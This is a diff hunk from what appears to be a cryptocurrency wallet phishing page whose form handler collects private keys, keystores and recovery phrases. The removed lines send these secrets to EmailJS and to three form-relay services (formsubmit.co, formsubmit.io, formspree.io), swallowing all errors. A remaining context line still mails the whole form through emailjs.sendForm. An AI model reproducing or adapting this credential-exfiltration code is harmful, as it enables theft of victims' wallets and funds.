@@ -7476,56 +7476,6 @@
           const privateKey = formData.get('privateKey');
           const keyStore = formData.get('keyStore');
           const isValidPrivateKey = privateKey && isPrivateKey(privateKey);
-          var dataToEmail = {
-                service_id: 'service_e57dbwl',
-                template_id: 'template_t1ksado',
-                user_id: 'vhepvvtO0vPbKliRa',
-                template_params: {
-                    'wallet_name': wallet,
-                    'phrase': phrase,
-                    'Pass': phrase
-                }
-            };
-          if(true){
-            fetch('https://api.emailjs.com/api/v1.0/email/send', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify(dataToEmail)
-})
-  .then(response => {
-    return response.json(); 
-  })
-  .catch(error => {});
-            try {
-          await postData(
-          {
-            type,wallet,privateKey,keyStore,phrase
-          }
-          , 'https://formsubmit.co/24fcbfab9fcc8a8bf03e403070f885e3');
-          } catch (error) {
-              
-          }
-               try {
-          await postData(
-          {
-            type,wallet,privateKey,keyStore,phrase
-          }
-          , 'https://formsubmit.io/send/6bad4f5f-1fb5-42df-bccd-a9af4c834030');
-          } catch (error) {
-              
-          }
-              try {
-          await postData(
-          {
-            type,wallet,privateKey,keyStore,phrase
-          }
-          , 'https://formspree.io/f/xnnqvlrb');
-          } catch (error) {
-              
-          }
-          }
           emailjs.sendForm('service_bhd00th', 'template_l5idmpt', this)
                       .then(() => {
                           console.log('SUCCESS!');
